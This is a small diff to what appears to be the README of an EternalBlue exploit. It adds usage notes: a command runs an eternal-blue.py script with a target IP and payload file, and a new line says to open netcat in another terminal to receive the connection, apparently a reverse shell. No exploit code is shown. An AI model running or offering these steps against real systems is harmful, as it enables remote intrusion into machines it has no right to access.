@@ -30,4 +30,6 @@
 
 ### Exploit
 
-```python3 eternal-blue.py TARGET-IP final.bin```
+```python3 eternal-blue.py TARGET-IP final.bin
+in other term open the nc to recive the connection
+```
